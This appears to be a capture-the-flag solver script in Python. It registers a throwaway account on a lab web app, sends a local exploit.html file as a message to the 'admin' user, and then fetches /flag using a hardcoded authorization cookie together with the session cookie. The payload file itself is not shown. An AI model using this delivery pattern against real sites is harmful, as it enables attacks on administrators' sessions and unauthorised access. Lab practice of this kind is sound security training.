#!/usr/bin/env python3
# encoding: utf-8


from requests import Session, get
from secrets import token_hex


url = "http://172.19.163.81:5000"
session = Session()


def register():
    random = token_hex(16)
    credentials = {
        "username": random,
        "password": random
    }
    session.post(f"{url}/register", data=credentials)
    return credentials


def login(credentials):
    session.get(f"{url}/login")
    session.post(f"{url}/login", data=credentials)


def send_messages(content):
    message = {
        "destination_username": "admin",
        "content": content
    }
    session.post(f"{url}/messages", data=message)


def get_flag():
    authentication_cookie = session.cookies.get_dict()["authentication"]
    cookies = {
        "authorization": "fullyponcedbocklit",
        "authentication": authentication_cookie
    }
    response = get(f"{url}/flag", cookies=cookies).text
    print(response)


if __name__ == "__main__":
    credentials = register()
    login(credentials)
    with open("./exploit.html") as file:
        exploit = file.read()
        send_messages(exploit)
    get_flag()
